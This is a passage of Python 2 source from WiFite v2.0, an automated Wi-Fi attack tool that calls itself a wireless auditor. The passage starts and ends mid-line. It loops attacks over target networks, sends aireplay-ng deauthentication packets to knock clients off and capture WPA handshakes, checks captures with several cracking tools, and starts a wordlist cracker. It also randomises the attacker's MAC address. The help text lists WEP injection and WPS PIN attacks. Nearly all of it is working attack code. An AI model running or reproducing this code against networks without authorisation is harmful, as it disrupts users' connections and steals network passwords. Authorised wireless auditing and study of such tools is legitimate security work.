self.RUN_CONFIG)\n                    if wpa_attack.RunAttack():\n                        wpa_success += 1\n\n            elif t.encryption.find('WEP') != -1:\n                wep_total += 1\n                wep_attack = WEPAttack(iface, t, ts_clients, self.RUN_CONFIG)\n                if wep_attack.RunAttack():\n                    wep_success += 1\n\n            else:\n                print R + ' unknown encryption:', t.encryption, W\n\n            # If user wants to stop attacking\n            if self.RUN_CONFIG.TARGETS_REMAINING <= 0: break\n\n        if wpa_total + wep_total > 0:\n            # Attacks are done! Show results to user\n            print ''\n            print GR + ' [+] %s%d attack%s completed:%s' % (\n            G, wpa_total + wep_total, '' if wpa_total + wep_total == 1 else 's', W)\n            print ''\n            if wpa_total > 0:\n                if wpa_success == 0:\n                    print GR + ' [+]' + R,\n                elif wpa_success == wpa_total:\n                    print GR + ' [+]' + G,\n                else:\n                    print GR + ' [+]' + O,\n                print '%d/%d%s WPA attacks succeeded' % (wpa_success, wpa_total, W)\n\n                for finding in self.RUN_CONFIG.WPA_FINDINGS:\n                    print '        ' + C + finding + W\n\n            if wep_total > 0:\n                if wep_success == 0:\n                    print GR + ' [+]' + R,\n                elif wep_success == wep_total:\n                    print GR + ' [+]' + G,\n                else:\n                    print GR + ' [+]' + O,\n                print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)\n\n                for finding in self.RUN_CONFIG.WEP_FINDINGS:\n                    print '        ' + C + finding + W\n\n            caps = len(self.RUN_CONFIG.WPA_CAPS_TO_CRACK)\n            if caps > 0 and not self.RUN_CONFIG.WPA_DONT_CRACK:\n                print GR + ' [+]' + W + ' starting ' + G + 'WPA cracker' + W + ' on %s%d handshake%s' % (\n                G, caps, W if caps == 1 else 's' + W)\n                for cap in self.RUN_CONFIG.WPA_CAPS_TO_CRACK:\n                    wpa_crack(cap, self.RUN_CONFIG)\n\n        print ''\n        self.RUN_CONFIG.exit_gracefully(0)\n\n    def parse_csv(self, filename):\n        \"\"\"\n            Parses given lines from airodump-ng CSV file.\n            Returns tuple: List of targets and list of clients.\n        \"\"\"\n        if not os.path.exists(filename): return ([], [])\n        targets = []\n        clients = []\n        try:\n            hit_clients = False\n            with open(filename, 'rb') as csvfile:\n                targetreader = csv.reader((line.replace('\\0', '') for line in csvfile), delimiter=',')\n                for row in targetreader:\n                    if len(row) < 2:\n                        continue\n                    if not hit_clients:\n                        if row[0].strip() == 'Station MAC':\n                            hit_clients = True\n                            continue\n                        if len(row) < 14:\n                            continue\n                        if row[0].strip() == 'BSSID':\n                            continue\n                        enc = row[5].strip()\n                        wps = False\n                        # Ignore non-WPA and non-WEP encryption\n                        if enc.find('WPA') == -1 and enc.find('WEP') == -1: continue\n                        if self.RUN_CONFIG.WEP_DISABLE and enc.find('WEP') != -1: continue\n                        if self.RUN_CONFIG.WPA_DISABLE and self.RUN_CONFIG.WPS_DISABLE and enc.find(\n                                'WPA') != -1: continue\n                        if enc == \"WPA2WPA\" or enc == \"WPA2 WPA\":\n                            enc = \"WPA2\"\n                            wps = True\n                        if len(enc) > 4:\n                            enc = enc[4:].strip()\n                        power = int(row[8].strip())\n\n                        ssid = row[13].strip()\n                        ssidlen = int(row[12].strip())\n                        ssid = ssid[:ssidlen]\n\n                        if power < 0: power += 100\n                        t = Target(row[0].strip(), power, row[10].strip(), row[3].strip(), enc, ssid)\n                        t.wps = wps\n                        targets.append(t)\n                    else:\n                        if len(row) < 6:\n                            continue\n                        bssid = re.sub(r'[^a-zA-Z0-9:]', '', row[0].strip())\n                        station = re.sub(r'[^a-zA-Z0-9:]', '', row[5].strip())\n                        power = row[3].strip()\n                        if station != 'notassociated':\n                            c = Client(bssid, station, power)\n                            clients.append(c)\n        except IOError as e:\n            print \"I/O error({0}): {1}\".format(e.errno, e.strerror)\n            return ([], [])\n\n        return (targets, clients)\n\n    def analyze_capfile(self, capfile):\n        \"\"\"\n            Analyzes given capfile for handshakes using various programs.\n            Prints results to console.\n        \"\"\"\n        # we're not running an attack\n        wpa_attack = WPAAttack(None, None, None, None)\n\n        if self.RUN_CONFIG.TARGET_ESSID == '' and self.RUN_CONFIG.TARGET_BSSID == '':\n            print R + ' [!]' + O + ' target ssid and bssid are required to check for handshakes'\n            print R + ' [!]' + O + ' please enter essid (access point name) using -e <name>'\n            print R + ' [!]' + O + ' and/or target bssid (mac address) using -b <mac>\\n'\n            # exit_gracefully(1)\n\n        if self.RUN_CONFIG.TARGET_BSSID == '':\n            # Get the first BSSID found in tshark!\n            self.RUN_CONFIG.TARGET_BSSID = get_bssid_from_cap(self.RUN_CONFIG.TARGET_ESSID, capfile)\n            # if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''\n            if self.RUN_CONFIG.TARGET_BSSID == '':\n                print R + ' [!]' + O + ' unable to guess BSSID from ESSID!'\n            else:\n                print GR + ' [+]' + W + ' guessed bssid: %s' % (G + self.RUN_CONFIG.TARGET_BSSID + W)\n\n        if self.RUN_CONFIG.TARGET_BSSID != '' and self.RUN_CONFIG.TARGET_ESSID == '':\n            self.RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(self.RUN_CONFIG.TARGET_BSSID, capfile)\n\n        print GR + '\\n [+]' + W + ' checking for handshakes in %s' % (G + capfile + W)\n\n        t = Target(self.RUN_CONFIG.TARGET_BSSID, '', '', '', 'WPA', self.RUN_CONFIG.TARGET_ESSID)\n\n        if program_exists('pyrit'):\n            result = wpa_attack.has_handshake_pyrit(t, capfile)\n            print GR + ' [+]' + W + '    ' + G + 'pyrit' + W + ':\\t\\t\\t %s' % (\n            G + 'found!' + W if result else O + 'not found' + W)\n        else:\n            print R + ' [!]' + O + ' program not found: pyrit'\n        if program_exists('cowpatty'):\n            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=True)\n            print GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (nonstrict):\\t %s' % (\n            G + 'found!' + W if result else O + 'not found' + W)\n            result = wpa_attack.has_handshake_cowpatty(t, capfile, nonstrict=False)\n            print GR + ' [+]' + W + '    ' + G + 'cowpatty' + W + ' (strict):\\t %s' % (\n            G + 'found!' + W if result else O + 'not found' + W)\n        else:\n            print R + ' [!]' + O + ' program not found: cowpatty'\n        if program_exists('tshark'):\n            result = wpa_attack.has_handshake_tshark(t, capfile)\n            print GR + ' [+]' + W + '    ' + G + 'tshark' + W + ':\\t\\t\\t %s' % (\n            G + 'found!' + W if result else O + 'not found' + W)\n        else:\n            print R + ' [!]' + O + ' program not found: tshark'\n        if program_exists('aircrack-ng'):\n            result = wpa_attack.has_handshake_aircrack(t, capfile)\n            print GR + ' [+]' + W + '    ' + G + 'aircrack-ng' + W + ':\\t\\t %s' % (\n            G + 'found!' + W if result else O + 'not found' + W)\n        else:\n            print R + ' [!]' + O + ' program not found: aircrack-ng'\n\n        print ''\n\n        self.RUN_CONFIG.exit_gracefully(0)\n\n\n##################\n# MAIN FUNCTIONS #\n##################\n\n##############################################################\n### End Classes\n\ndef rename(old, new):\n    \"\"\"\n        Renames file 'old' to 'new', works with separate partitions.\n        Thanks to hannan.sadar\n    \"\"\"\n    try:\n        os.rename(old, new)\n    except os.error, detail:\n        if detail.errno == errno.EXDEV:\n            try:\n                copy(old, new)\n            except:\n                os.unlink(new)\n                raise\n                os.unlink(old)\n        # if desired, deal with other errors\n        else:\n            raise\n\n\ndef banner(RUN_CONFIG):\n    \"\"\"\n        Displays ASCII art of the highest caliber.\n    \"\"\"\n    print ''\n    print G + \"  .;'                     `;,    \"\n    print G + \" .;'  ,;'             `;,  `;,   \" + W + \"WiFite v2.0 (r\" + str(RUN_CONFIG.REVISION) + \")\"\n    print G + \".;'  ,;'  ,;'     `;,  `;,  `;,  \"\n    print G + \"::   ::   :   \" + GR + \"( )\" + G + \"   :   ::   ::  \" + GR + \"automated wireless auditor\"\n    print G + \"':.  ':.  ':. \" + GR + \"/_\\\\\" + G + \" ,:'  ,:'  ,:'  \"\n    print G + \" ':.  ':.    \" + GR + \"/___\\\\\" + G + \"    ,:'  ,:'   \" + G + \"try the new version:\"\n    print G + \"  ':.       \" + GR + \"/_____\\\\\" + G + \"      ,:'     \" + C + \"https://github.com/derv82/wifite2\"\n    print G + \"           \" + GR + \"/       \\\\\" + G + \"             \"\n    print W\n\n\ndef help():\n    \"\"\"\n        Prints help screen\n    \"\"\"\n\n    head = W\n    sw = G\n    var = GR\n    des = W\n    de = G\n\n    print head + '   COMMANDS' + W\n    print sw + '\\t-check ' + var + '<file>\\t' + des + 'check capfile ' + var + '<file>' + des + ' for handshakes.' + W\n    print sw + '\\t-cracked    \\t' + des + 'display previously-cracked access points' + W\n    print sw + '\\t-recrack    \\t' + des + 'allow recracking of previously cracked access points' + W\n    print ''\n\n    print head + '   GLOBAL' + W\n    print sw + '\\t-all         \\t' + des + 'attack all targets.              ' + de + '[off]' + W\n    #print sw+'\\t-pillage     \\t'+des+'attack all targets in a looping fashion.'+de+'[off]'+W\n    print sw + '\\t-i ' + var + '<iface>  \\t' + des + 'wireless interface for capturing ' + de + '[auto]' + W\n    print sw + '\\t-mon-iface ' + var + '<monitor_interface>  \\t' + des + 'interface in monitor mode for capturing ' + de + '[auto]' + W\n    print sw + '\\t-mac         \\t' + des + 'anonymize mac address            ' + de + '[off]' + W\n    print sw + '\\t-c ' + var + '<channel>\\t' + des + 'channel to scan for targets      ' + de + '[auto]' + W\n    print sw + '\\t-e ' + var + '<essid>  \\t' + des + 'target a specific access point by ssid (name)  ' + de + '[ask]' + W\n    print sw + '\\t-b ' + var + '<bssid>  \\t' + des + 'target a specific access point by bssid (mac)  ' + de + '[auto]' + W\n    print sw + '\\t-showb       \\t' + des + 'display target BSSIDs after scan               ' + de + '[off]' + W\n    print sw + '\\t-pow ' + var + '<db>   \\t' + des + 'attacks any targets with signal strenghth > ' + var + 'db ' + de + '[0]' + W\n    print sw + '\\t-quiet       \\t' + des + 'do not print list of APs during scan           ' + de + '[off]' + W\n    print ''\n\n    print head + '\\n   WPA' + W\n    print sw + '\\t-wpa        \\t' + des + 'only target WPA networks (works with -wps -wep)   ' + de + '[off]' + W\n    print sw + '\\t-wpat ' + var + '<sec>   \\t' + des + 'time to wait for WPA attack to complete (seconds) ' + de + '[500]' + W\n    print sw + '\\t-wpadt ' + var + '<sec>  \\t' + des + 'time to wait between sending deauth packets (sec) ' + de + '[10]' + W\n    print sw + '\\t-strip      \\t' + des + 'strip handshake using tshark or pyrit             ' + de + '[off]' + W\n    print sw + '\\t-crack ' + var + '<dic>\\t' + des + 'crack WPA handshakes using ' + var + '<dic>' + des + ' wordlist file    ' + de + '[off]' + W\n    print sw + '\\t-dict ' + var + '<file>\\t' + des + 'specify dictionary to use when cracking WPA ' + de + '[phpbb.txt]' + W\n    print sw + '\\t-aircrack   \\t' + des + 'verify handshake using aircrack ' + de + '[on]' + W\n    print sw + '\\t-pyrit      \\t' + des + 'verify handshake using pyrit    ' + de + '[off]' + W\n    print sw + '\\t-tshark     \\t' + des + 'verify handshake using tshark   ' + de + '[on]' + W\n    print sw + '\\t-cowpatty   \\t' + des + 'verify handshake using cowpatty ' + de + '[off]' + W\n\n    print head + '\\n   WEP' + W\n    print sw + '\\t-wep        \\t' + des + 'only target WEP networks ' + de + '[off]' + W\n    print sw + '\\t-pps ' + var + '<num>  \\t' + des + 'set the number of packets per second to inject ' + de + '[600]' + W\n    print sw + '\\t-wept ' + var + '<sec> \\t' + des + 'sec to wait for each attack, 0 implies endless ' + de + '[600]' + W\n    print sw + '\\t-chopchop   \\t' + des + 'use chopchop attack      ' + de + '[on]' + W\n    print sw + '\\t-arpreplay  \\t' + des + 'use arpreplay attack     ' + de + '[on]' + W\n    print sw + '\\t-fragment   \\t' + des + 'use fragmentation attack ' + de + '[on]' + W\n    print sw + '\\t-caffelatte \\t' + des + 'use caffe-latte attack   ' + de + '[on]' + W\n    print sw + '\\t-p0841      \\t' + des + 'use -p0841 attack        ' + de + '[on]' + W\n    print sw + '\\t-hirte      \\t' + des + 'use hirte (cfrag) attack ' + de + '[on]' + W\n    print sw + '\\t-nofakeauth \\t' + des + 'stop attack if fake authentication fails    ' + de + '[off]' + W\n    print sw + '\\t-wepca ' + GR + '<n>  \\t' + des + 'start cracking when number of ivs surpass n ' + de + '[10000]' + W\n    print sw + '\\t-wepsave    \\t' + des + 'save a copy of .cap files to this directory ' + de + '[off]' + W\n\n    print head + '\\n   WPS' + W\n    print sw + '\\t-wps       \\t' + des + 'only target WPS networks         ' + de + '[off]' + W\n    print sw + '\\t-wpst ' + var + '<sec>  \\t' + des + 'max wait for new retry before giving up (0: never)  ' + de + '[660]' + W\n    print sw + '\\t-wpsratio ' + var + '<per>\\t' + des + 'min ratio of successful PIN attempts/total tries    ' + de + '[0]' + W\n    print sw + '\\t-wpsretry ' + var + '<num>\\t' + des + 'max number of retries for same PIN before giving up ' + de + '[0]' + W\n\n    print head + '\\n   EXAMPLE' + W\n    print sw + '\\t./wifite.py ' + W + '-wps -wep -c 6 -pps 600' + W\n    print ''\n\n\n###########################\n# WIRELESS CARD FUNCTIONS #\n###########################\n\n\n\n\n######################\n# SCANNING FUNCTIONS #\n######################\n\n\n\n\n\ndef wps_check_targets(targets, cap_file, verbose=True):\n    \"\"\"\n        Uses tshark to check access points in cap_file for WPS functionality.\n        Sets \"wps\" field of targets that match to True.\n    \"\"\"\n    global RUN_CONFIG\n\n    if not program_exists('tshark'):\n        RUN_CONFIG.WPS_DISABLE = True  # Tell 'scan' we were unable to execute tshark\n        return\n\n    if len(targets) == 0 or not os.path.exists(cap_file): return\n\n    if verbose:\n        print GR + ' [+]' + W + ' checking for ' + G + 'WPS compatibility' + W + '...',\n        stdout.flush()\n\n    cmd = [\n        'tshark',\n        '-r', cap_file, # Path to cap file\n        '-n', # Don't resolve addresses\n        # Filter WPS broadcast packets\n        '-Y', 'wps.wifi_protected_setup_state && wlan.da == ff:ff:ff:ff:ff:ff',\n        '-T', 'fields', # Only output certain fields\n        '-e', 'wlan.ta', # BSSID\n        '-e', 'wps.ap_setup_locked', # Locked status\n        '-E', 'separator=,' # CSV\n    ]\n    proc_tshark = Popen(cmd, stdout=PIPE, stderr=DN)\n    proc_tshark.wait()\n    tshark_stdout, _ = proc_tshark.communicate()\n    bssid_regex = re.compile(\"([A-F0-9\\:]{17})\", re.IGNORECASE)\n    bssids = [bssid.upper() for bssid in bssid_regex.findall(tshark_stdout)]\n    for t in targets:\n        if t.bssid.upper() in bssids:\n            t.wps = True\n        t.wps = t.bssid.upper() in bssids\n    if verbose:\n        print 'done'\n    removed = 0\n    if not RUN_CONFIG.WPS_DISABLE and RUN_CONFIG.WPA_DISABLE:\n        i = 0\n        while i < len(targets):\n            if not targets[i].wps and targets[i].encryption.find('WPA') != -1:\n                removed += 1\n                targets.pop(i)\n            else:\n                i += 1\n        if removed > 0 and verbose: print GR + ' [+]' + O + ' removed %d non-WPS-enabled targets%s' % (removed, W)\n\n\ndef print_and_exec(cmd):\n    \"\"\"\n        Prints and executes command \"cmd\". Also waits half a second\n        Used by rtl8187_fix (for prettiness)\n    \"\"\"\n    print '\\r                                                        \\r',\n    stdout.flush()\n    print O + ' [!] ' + W + 'executing: ' + O + ' '.join(cmd) + W,\n    stdout.flush()\n    call(cmd, stdout=DN, stderr=DN)\n    time.sleep(0.1)\n\n\n####################\n# HELPER FUNCTIONS #\n####################\n\ndef remove_airodump_files(prefix):\n    \"\"\"\n        Removes airodump output files for whatever file prefix ('wpa', 'wep', etc)\n        Used by wpa_get_handshake() and attack_wep()\n    \"\"\"\n    global RUN_CONFIG\n    remove_file(prefix + '-01.cap')\n    remove_file(prefix + '-01.csv')\n    remove_file(prefix + '-01.kismet.csv')\n    remove_file(prefix + '-01.kismet.netxml')\n    for filename in os.listdir(RUN_CONFIG.temp):\n        if filename.lower().endswith('.xor'): remove_file(RUN_CONFIG.temp + filename)\n    for filename in os.listdir('.'):\n        if filename.startswith('replay_') and filename.endswith('.cap'):\n            remove_file(filename)\n        if filename.endswith('.xor'): remove_file(filename)\n    # Remove .cap's from previous attack sessions\n    \"\"\"i = 2\n    while os.path.exists(temp + 'wep-' + str(i) + '.cap'):\n        os.remove(temp + 'wep-' + str(i) + '.cap')\n        i += 1\n    \"\"\"\n\n\ndef remove_file(filename):\n    \"\"\"\n        Attempts to remove a file. Does not throw error if file is not found.\n    \"\"\"\n    try:\n        os.remove(filename)\n    except OSError:\n        pass\n\n\ndef program_exists(program):\n    \"\"\"\n        Uses 'which' (linux command) to check if a program is installed.\n    \"\"\"\n\n    proc = Popen(['which', program], stdout=PIPE, stderr=PIPE)\n    txt = proc.communicate()\n    if txt[0].strip() == '' and txt[1].strip() == '':\n        return False\n    if txt[0].strip() != '' and txt[1].strip() == '':\n        return True\n\n    return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)\n\n\ndef sec_to_hms(sec):\n    \"\"\"\n        Converts integer sec to h:mm:ss format\n    \"\"\"\n    if sec <= -1: return '[endless]'\n    h = sec / 3600\n    sec %= 3600\n    m = sec / 60\n    sec %= 60\n    return '[%d:%02d:%02d]' % (h, m, sec)\n\n\ndef send_interrupt(process):\n    \"\"\"\n        Sends interrupt signal to process's PID.\n    \"\"\"\n    try:\n        os.kill(process.pid, SIGINT)\n        # os.kill(process.pid, SIGTERM)\n    except OSError:\n        pass  # process cannot be killed\n    except TypeError:\n        pass  # pid is incorrect type\n    except UnboundLocalError:\n        pass  # 'process' is not defined\n    except AttributeError:\n        pass  # Trying to kill \"None\"\n\n\ndef get_mac_address(iface):\n    \"\"\"\n        Returns MAC address of \"iface\".\n    \"\"\"\n    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)\n    proc.wait()\n    mac = ''\n    output = proc.communicate()[0]\n    mac_regex = ('[a-zA-Z0-9]{2}-' * 6)[:-1]\n    match = re.search(' (%s)' % mac_regex, output)\n    if match:\n        mac = match.groups()[0].replace('-', ':')\n    return mac\n\n\ndef generate_random_mac(old_mac):\n    \"\"\"\n        Generates a random MAC address.\n        Keeps the same vender (first 6 chars) of the old MAC address (old_mac).\n        Returns string in format old_mac[0:9] + :XX:XX:XX where X is random hex\n    \"\"\"\n    random.seed()\n    new_mac = old_mac[:8].lower().replace('-', ':')\n    for i in xrange(0, 6):\n        if i % 2 == 0: new_mac += ':'\n        new_mac += '0123456789abcdef'[random.randint(0, 15)]\n\n    # Prevent generating the same MAC address via recursion.\n    if new_mac == old_mac:\n        new_mac = generate_random_mac(old_mac)\n    return new_mac\n\n\ndef mac_anonymize(iface):\n    \"\"\"\n        Changes MAC address of 'iface' to a random MAC.\n        Only randomizes the last 6 digits of the MAC, so the vender says the same.\n        Stores old MAC address and the interface in ORIGINAL_IFACE_MAC\n    \"\"\"\n    global RUN_CONFIG\n    if RUN_CONFIG.DO_NOT_CHANGE_MAC: return\n    if not program_exists('ifconfig'): return\n\n    # Store old (current) MAC address\n    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN)\n    proc.wait()\n    for word in proc.communicate()[0].split('\\n')[0].split(' '):\n        if word != '': old_mac = word\n    RUN_CONFIG.ORIGINAL_IFACE_MAC = (iface, old_mac)\n\n    new_mac = generate_random_mac(old_mac)\n\n    call(['ifconfig', iface, 'down'])\n\n    print GR + \" [+]\" + W + \" changing %s's MAC from %s to %s...\" % (G + iface + W, G + old_mac + W, O + new_mac + W),\n    stdout.flush()\n\n    proc = Popen(['ifconfig', iface, 'hw', 'ether', new_mac], stdout=PIPE, stderr=DN)\n    proc.wait()\n    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)\n    print 'done'\n\n\ndef mac_change_back():\n    \"\"\"\n        Changes MAC address back to what it was before attacks began.\n    \"\"\"\n    global RUN_CONFIG\n    iface = RUN_CONFIG.ORIGINAL_IFACE_MAC[0]\n    old_mac = RUN_CONFIG.ORIGINAL_IFACE_MAC[1]\n    if iface == '' or old_mac == '': return\n\n    print GR + \" [+]\" + W + \" changing %s's mac back to %s...\" % (G + iface + W, G + old_mac + W),\n    stdout.flush()\n\n    call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)\n    proc = Popen(['ifconfig', iface, 'hw', 'ether', old_mac], stdout=PIPE, stderr=DN)\n    proc.wait()\n    call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)\n    print \"done\"\n\n\ndef get_essid_from_cap(bssid, capfile):\n    \"\"\"\n        Attempts to get ESSID from cap file using BSSID as reference.\n        Returns '' if not found.\n    \"\"\"\n    if not program_exists('tshark'): return ''\n\n    cmd = ['tshark',\n           '-r', capfile,\n           '-R', 'wlan.fc.type_subtype == 0x05 && wlan.sa == %s' % bssid,\n           '-2', # -R is deprecated and requires -2\n           '-n']\n    proc = Popen(cmd, stdout=PIPE, stderr=DN)\n    proc.wait()\n    for line in proc.communicate()[0].split('\\n'):\n        if line.find('SSID=') != -1:\n            essid = line[line.find('SSID=') + 5:]\n            print GR + ' [+]' + W + ' guessed essid: %s' % (G + essid + W)\n            return essid\n    print R + ' [!]' + O + ' unable to guess essid!' + W\n    return ''\n\n\ndef get_bssid_from_cap(essid, capfile):\n    \"\"\"\n        Returns first BSSID of access point found in cap file.\n        This is not accurate at all, but it's a good guess.\n        Returns '' if not found.\n    \"\"\"\n    global RUN_CONFIG\n\n    if not program_exists('tshark'): return ''\n\n    # Attempt to get BSSID based on ESSID\n    if essid != '':\n        cmd = ['tshark',\n               '-r', capfile,\n               '-R', 'wlan_mgt.ssid == \"%s\" && wlan.fc.type_subtype == 0x05' % (essid),\n               '-2', # -R is deprecated and requires -2\n               '-n',  # Do not resolve MAC vendor names\n               '-T', 'fields',  # Only display certain fields\n               '-e', 'wlan.sa']  # souce MAC address\n        proc = Popen(cmd, stdout=PIPE, stderr=DN)\n        proc.wait()\n        bssid = proc.communicate()[0].split('\\n')[0]\n        if bssid != '': return bssid\n\n    cmd = ['tshark',\n           '-r', capfile,\n           '-R', 'eapol',\n           '-2', # -R is deprecated and requires -2\n           '-n']\n    proc = Popen(cmd, stdout=PIPE, stderr=DN)\n    proc.wait()\n    for line in proc.communicate()[0].split('\\n'):\n        if line.endswith('Key (msg 1/4)') or line.endswith('Key (msg 3/4)'):\n            while line.startswith(' ') or line.startswith('\\t'): line = line[1:]\n            line = line.replace('\\t', ' ')\n            while line.find('  ') != -1: line = line.replace('  ', ' ')\n            return line.split(' ')[2]\n        elif line.endswith('Key (msg 2/4)') or line.endswith('Key (msg 4/4)'):\n            while line.startswith(' ') or line.startswith('\\t'): line = line[1:]\n            line = line.replace('\\t', ' ')\n            while line.find('  ') != -1: line = line.replace('  ', ' ')\n            return line.split(' ')[4]\n    return ''\n\n\ndef attack_interrupted_prompt():\n    \"\"\"\n        Promps user to decide if they want to exit,\n        skip to cracking WPA handshakes,\n        or continue attacking the remaining targets (if applicable).\n        returns True if user chose to exit complete, False otherwise\n    \"\"\"\n    global RUN_CONFIG\n    should_we_exit = False\n    # If there are more targets to attack, ask what to do next\n    if RUN_CONFIG.TARGETS_REMAINING > 0:\n        options = ''\n        print GR + \"\\n [+] %s%d%s target%s remain%s\" % (G, RUN_CONFIG.TARGETS_REMAINING, W,\n                                                        '' if RUN_CONFIG.TARGETS_REMAINING == 1 else 's',\n                                                        's' if RUN_CONFIG.TARGETS_REMAINING == 1 else '')\n        print GR + \" [+]\" + W + \" what do you want to do?\"\n        options += G + 'c' + W\n        print G + \"     [c]ontinue\" + W + \" attacking targets\"\n\n        if len(RUN_CONFIG.WPA_CAPS_TO_CRACK) > 0:\n            options += W + ', ' + O + 's' + W\n            print O + \"     [s]kip\" + W + \" to cracking WPA cap files\"\n        options += W + ', or ' + R + 'e' + W\n        print R + \"     [e]xit\" + W + \" completely\"\n        ri = ''\n        while ri != 'c' and ri != 's' and ri != 'e':\n            ri = raw_input(GR + ' [+]' + W + ' please make a selection (%s): ' % options)\n\n        if ri == 's':\n            RUN_CONFIG.TARGETS_REMAINING = -1  # Tells start() to ignore other targets, skip to cracking\n        elif ri == 'e':\n            should_we_exit = True\n    return should_we_exit\n\n\n#\n# Abstract base class for attacks.\n# Attacks are required to implement the following methods:\n#       RunAttack - Initializes the attack\n#       EndAttack - Cleanly ends the attack\n#\nclass Attack(object):\n    __metaclass__ = abc.ABCMeta\n\n    @abc.abstractmethod\n    def RunAttack(self):\n        raise NotImplementedError()\n\n    @abc.abstractmethod\n    def EndAttack(self):\n        raise NotImplementedError()\n\n\n#################\n# WPA FUNCTIONS #\n#################\nclass WPAAttack(Attack):\n    def __init__(self, iface, target, clients, config):\n        self.iface = iface\n        self.clients = clients\n        self.target = target\n        self.RUN_CONFIG = config\n\n    def RunAttack(self):\n        '''\n            Abstract method for initializing the WPA attack\n        '''\n        self.wpa_get_handshake()\n\n    def EndAttack(self):\n        '''\n            Abstract method for ending the WPA attack\n        '''\n        pass\n\n    def wpa_get_handshake(self):\n        \"\"\"\n            Opens an airodump capture on the target, dumping to a file.\n            During the capture, sends deauthentication packets to the target both as\n            general deauthentication packets and specific packets aimed at connected clients.\n            Waits until a handshake is captured.\n                \"iface\"   - interface to capture on\n                \"target\"  - Target object containing info on access point\n                \"clients\" - List of Client objects associated with the target\n            Returns True if handshake was found, False otherwise\n        \"\"\"\n\n        if self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0: self.RUN_CONFIG.WPA_ATTACK_TIMEOUT = -1\n\n        # Generate the filename to save the .cap file as <SSID>_aa-bb-cc-dd-ee-ff.cap\n        save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \\\n                  + '_' + self.target.bssid.replace(':', '-') + '.cap'\n\n        # Check if we already have a handshake for this SSID... If we do, generate a new filename\n        save_index = 0\n        while os.path.exists(save_as):\n            save_index += 1\n            save_as = self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep + re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) \\\n                      + '_' + self.target.bssid.replace(':', '-') \\\n                      + '_' + str(save_index) + '.cap'\n\n        file_prefix = os.path.join(self.RUN_CONFIG.temp, 'wpa')\n        cap_file = file_prefix + '-01.cap'\n        csv_file = file_prefix + '-01.csv'\n\n        # Remove previous airodump output files (if needed)\n        remove_airodump_files(file_prefix)\n\n        # Start of large Try-Except; used for catching keyboard interrupt (Ctrl+C)\n        try:\n            # Start airodump-ng process to capture handshakes\n            cmd = ['airodump-ng',\n                   '-w', file_prefix,\n                   '-c', self.target.channel,\n                   '--write-interval', '1',\n                   '--bssid', self.target.bssid,\n                   self.iface]\n            proc_read = Popen(cmd, stdout=DN, stderr=DN)\n\n            # Setting deauthentication process here to avoid errors later on\n            proc_deauth = None\n\n            print ' %s starting %swpa handshake capture%s on \"%s\"' % \\\n                  (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT) + W, G, W, G + self.target.ssid + W)\n            got_handshake = False\n\n            seconds_running = 0\n            seconds_since_last_deauth = 0\n\n            target_clients = self.clients[:]\n            client_index = -1\n            start_time = time.time()\n            # Deauth and check-for-handshake loop\n            while not got_handshake and (\n                    self.RUN_CONFIG.WPA_ATTACK_TIMEOUT <= 0 or seconds_running < self.RUN_CONFIG.WPA_ATTACK_TIMEOUT):\n                if proc_read.poll() != None:\n                    print \"\"\n                    print \"airodump-ng exited with status \" + str(proc_read.poll())\n                    print \"\"\n                    break\n                time.sleep(1)\n                seconds_since_last_deauth += int(time.time() - start_time - seconds_running)\n                seconds_running = int(time.time() - start_time)\n\n                print \"                                                          \\r\",\n                print ' %s listening for handshake...\\r' % \\\n                      (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W),\n                stdout.flush()\n\n                if seconds_since_last_deauth > self.RUN_CONFIG.WPA_DEAUTH_TIMEOUT:\n                    seconds_since_last_deauth = 0\n                    # Send deauth packets via aireplay-ng\n                    cmd = ['aireplay-ng',\n                           '--ignore-negative-one',\n                           '--deauth',\n                           str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send\n                           '-a', self.target.bssid]\n\n                    client_index += 1\n\n                    if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):\n                        print \" %s sending %s deauth to %s*broadcast*%s...\" % \\\n                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W,\n                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, G, W),\n                        client_index = -1\n                    else:\n                        print \" %s sending %s deauth to %s... \" % \\\n                              (GR + sec_to_hms(self.RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running) + W, \\\n                               G + str(self.RUN_CONFIG.WPA_DEAUTH_COUNT) + W, \\\n                               G + target_clients[client_index].bssid + W),\n                        cmd.append('-c')\n                        cmd.append(target_clients[client_index].bssid)\n                    cmd.append(self.iface)\n                    stdout.flush()\n\n                    # Send deauth packets via aireplay, wait for them to complete.\n                    proc_deauth = Popen(cmd, stdout=DN, stderr=DN)\n                    proc_deauth.wait()\n                    print \"sent\\r\",\n                    stdout.flush()\n\n                # Copy current dump file for consistency\n                if not os.path.exists(cap_file): continue\n                temp_cap_file = cap_file + '.temp'\n                copy(cap_file, temp_cap_file)\n\n                # Save copy of cap file (for debugging)\n                #remove_file('/root/new/wpa-01.cap')\n                #copy(temp + 'wpa-01.cap', '/root/new/wpa-01.cap')\n\n                # Check for handshake\n                if self.has_handshake(self.target, temp_cap_file):\n                    got_handshake = True\n\n                    try:\n                        os.mkdir(self.RUN_CONFIG.WPA_HANDSHAKE_DIR + os.sep)\n                    except OSError:\n                        pass\n\n                    # Kill the airodump and aireplay processes\n                    send_interrupt(proc_read)\n                    send_interrupt(proc_deauth)\n\n                    # Save a copy of the handshake\n                    rename(temp_cap_file, 